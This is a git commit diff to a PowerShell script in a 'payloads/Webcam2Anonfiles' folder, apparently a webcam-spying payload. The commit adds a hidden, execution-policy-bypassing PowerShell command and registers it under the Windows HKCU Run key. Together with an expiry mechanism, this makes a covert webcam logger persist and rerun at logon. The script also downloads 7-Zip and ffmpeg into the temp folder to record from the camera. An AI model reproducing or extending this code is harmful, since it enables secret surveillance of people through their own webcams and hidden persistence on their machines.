7acff7f0928e5a498e954fd991b3279531dc4422
Oscar <oscarrc.web@gmail.com>
2023-07-07 11:35:48 +0200

    [FIX] Missing autostart

--- payloads/Webcam2Anonfiles/script.ps1
+++ payloads/Webcam2Anonfiles/script.ps1
@@ -10,26 +10,26 @@ function Persist-Logger {
     if($DaysRun -eq -1 -or $DaysRun -gt 0){
         if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
     
-        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Value $Command;
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Value $Command;
     
         if($DaysRun -eq -1){ return };
         if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
     
         $date = (Get-Date).AddDays($daysRun);
         New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
-        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date' -Value $date;
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date" -Value $date;
     }
     
     if($DaysRun -gt 0){
         $date = Get-Date;
-        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date';
+        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name "date";
         $targetDate = [DateTime]$targetValue.date;
     
         if($date -lt $targetDate){ return }
     
         Remove-Item "$env:temp\txtlog.ps1" -Force;
         Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
-        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Force
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -Force
     }
 }
 
@@ -82,7 +82,7 @@ $ProgressPreference = "SilentlyContinue";
 New-Item -Path $env:temp -ItemType Directory -Force;
 Set-Location $env:temp;
 
-if(-not (Test-Path -Path 'ffmpeg/ffmpeg.exe' -PathType Leaf)){
+if(-not (Test-Path -Path "ffmpeg/ffmpeg.exe" -PathType Leaf)){
     $7zurl = "https://7-zip.org/" + (Invoke-WebRequest -UseBasicParsing -Uri "https://7-zip.org/" | Select-Object -ExpandProperty Links | Where-Object { $_.href -like "a/7zr.exe" } | Select-Object -First 1 | Select-Object -ExpandProperty href);
     Invoke-WebRequest $7zurl -OutFile "7z.exe" | Wait-Process;
 
@@ -93,6 +93,8 @@ if(-not (Test-Path -Path 'ffmpeg/ffmpeg.exe' -PathType Leaf)){
     Remove-Item "ffmpeg.zip" -Force;
     Remove-Item "7z.exe" -Force;
 }
+
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit');
 
 Persist-Logger "camlog" -Command $autostart;
 Start-WebcamLogger -RecordTime $RecordTime -TimesRun $TimesRun -Delay $Delay;
